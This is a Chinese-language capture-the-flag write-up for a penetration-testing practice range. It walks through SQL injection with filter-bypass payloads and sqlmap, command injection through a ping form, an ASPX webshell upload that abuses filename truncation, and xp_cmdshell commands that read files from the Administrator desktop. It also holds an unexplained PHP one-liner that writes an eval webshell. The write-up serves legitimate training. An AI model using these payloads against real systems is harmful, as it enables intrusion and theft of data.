# 靶场搭建

靶场下载链接：

```
https://pan.baidu.com/s/1ce1Kk0hSYlxrUoRTnNsiKA?pwd\=ha1x
```

下载好后直接用vmware打开，有两个靶机，一个是基础题，还有个综合题。基础题是pte-centos6，综合题是pte-2003

打开后然后用vim设置静态IP地址，虚拟机用net模式的话，就设置与你虚拟机同一个网段

```
vim /etc/sysconfig/network-scripts/ifcfg-eth0
```

设置好后reboot重启一下即可，然后访问81-85端口，共5题。因为靶场出了问题，只能打开第一题，建议按照原网络环境去设置仅主机模式，原IP地址是172.16.12.100,虚拟机中的攻击机也可以配置同网段仅主机模式即可，问题不大。pet-2003设置net模式就好了，发现用桥接模式扫描端口失败

  

  

# 基础题目之SQL注入

![](../Images/34e1e58dd4b8306d7b06692d82989e43.png)

 通过SQL注入漏洞读取/tmp/360/key文件,答案就在文件中

![](../Images/b68313336e2eb31519a659f3a3cadb67.png)

手工注入的话有点麻烦，它过滤了union，可以使用双写绕过，ununionion，空格可以用%0a绕过，#号可以用编码%23进行绕过。

首先判断字段数

```
http://172.16.12.100:81/vulnerabilities/fu1.php?id\=1%27)%0aorder%0aby%0a5%23
```

order by到5就显示不正常，那么字段数就是4

![](../Images/8818d90b1bceedb9b00bc1b30aee6fd0.png)

![](../Images/dc112c04951fc852c2f1a80d89eec4de.png)

  

然后就使用联合查询去注入

```
http://172.16.12.100:81/vulnerabilities/fu1.php?id\=\-1%27)%0aununionion%0aselect%0a1,load\_file(%27/tmp/360/key%27),3,4%23
```

![](../Images/dd8a9e14c00eb676f313a7453e394992.png)

也使用sqlmap完成本题，因为有简单的过滤，可以使用自带的绕过脚本space2comment

```
sqlmap.py \-u http://192.168.136.155:81/vulnerabilities/fu1.php?id\=1 \--level 5 \--risk 3 \--tamper\=space2comment
```

ok了，得出存在布尔型注入以及延时注入

![](../Images/bdd9d73e9afba6614df53869b62f5b35.png)

因为本题的flag在/tmp/360/key文件，那么我们直接进入到sql-shell，用查询语句获得flag

```
sqlmap.py \-u http://192.168.136.155:81/vulnerabilities/fu1.php?id\=1 \--level 5 \--risk 3 \--tamper\=space2comment \--sql-shell
```

进入sql-shell以后，我们用load\_file语句去读取文件

```
select load\_file('/tmp/360/key');
```

![](../Images/1c11a41470a45683db856bbc110f3129.png)

得出key：8b3h4a7v

<?php fputs(fopen('a.php', 'w'),'<?php eval($\_POST\[anhunsec\]); ?>'); ?>

# 基础题目之命令执行

![](../Images/62134a9dfa830069c669f1d2ed6c16cf.png)

通过你所学到的知识，通过执行Linux命令获取webshell，答案就在根目录下key.php文件中。

输入ip，他就可以执行ping命令

![](../Images/2852be109d5715d6aef647c8a1173fe4.png)

```
127.0.0.1 | id
```

![](../Images/dcd4f1dd18e0fd7673ea39168db5c3e5.png)

```
127.0.0.1 | cat key.php
```

![](../Images/798e19d23e63a0248571222342af9401.png)

包含敏感字符，过滤了cat，

其实应该先找key文件在哪里，它过滤了ls，那么只能盲测，less是没有被过滤的，那么直接less key.php，看能不能显示出内容。

```
127.0.0.1 | less key.php
```

很显然，没有反应。

![](../Images/bd24988a154f348d1c3d095ce2a554fc.png)

那么就切换到上一级目录

```
127.0.0.1 | less ../key.php
```

![](../Images/d0525e39431faece11d2ef3d1fd0a3cc.png)

他有显示GET it，说明key文件是在上一级目录，那么怎么获取他的key呢？其实可以使用grep去查找带有key字样的内容

```
127.0.0.1 | grep 'key' ../key.php
```

![](../Images/6bc9177f3c735c6fc3b8097fb4cbdca1.png)

key:3s9j6c2k

# 综合题

已知IP地址是：192.168.1.119，端口范围在27000-28000

首先namp扫描端口

```
nmap \-sS \-T4 \-p 27000\-28000 192.168.136.136
```

![](../Images/ee071995d5e799833d19d2446fd5eae9.png)

扫描到27689端口开放，访问后是一个文件上传下载系统

![](../Images/602f576b58eaeb960e12557e33ef82e9.png)

还不知道账号密码，先扫描一波目录，当然最好使用多个工具互补扫描

![](../Images/43780f77de2a7300e7855e6b3cde947f.png)

发现存在robots.txt以及一个配置备份文件

![](../Images/1eb10f80b8246ddbf0463c19e27752b7.png)

![](../Images/385c2ca7b34d02fc9eb255ee4676f18b.png)

有数据库的账号密码，直接用navcat去连接，是sql server的数据库

![](../Images/7c79617103609fa60ec46793bf1e00c2.png)

得到登陆账号和密码admin |asdadwn\_d2112

![](../Images/026a4b2dd836daf9978814cb47e8b565.png)

登陆后得到key1:4k3s9m3d![](../Images/455e1e5489a0d19bbc00e42cbf8fec2b.png)

然后进入文件上传功能，上传aspx的马。先正常上传shell.aspx，提示该文件不允许上传，文件名先改成.jpg格式上传

![](../Images/5b215ae6d04bc86a9c924336a3a426aa.png)

发现上传成功

![](../Images/6b93db4c117457a183be5b9218015d23.png)

点击管理上传文件，发现文件名jp后面没掉了g

![](../Images/6e4317d5cc66ac1cd9e51068ef5ed6ab.png)

经过多次测试，文件名达到8位字符时，就可以省略后面的jpg，因为页面中说了文件名过长会被系统截取包括系统时间在内的前32位字符作为文件名，请上传的文件名称不要过长.时间是18个字符，杠一个字符，.aspx5个字符，总共24字符，32-24=8，说明文件名要8位字符，才能把.jpg后面都被系统截断

随后就是找文件路径了，点击最下面上传的文件

![](../Images/f7e87a4c5b2fefd3e8134ea0817d4dd2.png)

发现它的上传路径是upfile/affix/

![](../Images/e7e58d0a45cb6d9bcda1c648a9450cac.png)

然后拼接一下webshell路径

```
http://192.168.136.136:27689/upfile/affix/638123235837656250-shelllll.aspx
```

![](../Images/8bac8b689acbb0dc8f23e84e50ac0bd1.png)

web根目录获得key2:2a3s9p4d

![](../Images/8da4351c54df3095b1b81ab1da6e31bb.png)

接下来就是进入系统桌面，但是发现权限不够

![](../Images/226daba7877eefc6bb3d63adef6428fe.png)

在web目录中，看到了web.config.back-2017-12-12文件，点开来刚好是sa权限的用户

那么继续使用navcat去连接

![](../Images/9893045fce186c6748431f066c7b40db.png)

连接后使用sql-server查询语句去查询系统文件

先看看桌面里有什么文件

```
exec xp\_cmdshell 'dir "C:\\Documents and Settings\\Administrator\\桌面"'
```

![](../Images/b7a03c26530e705b786319df7798a256.png)

发现有个key,txt，接下来就读取一下就行了

```
exec xp\_cmdshell 'type "C:\\Documents and Settings\\Administrator\\桌面\\key.txt"'
```

![](../Images/95349f8f7e068f870880411b8486013e.png)

key3:4d9d3q8v
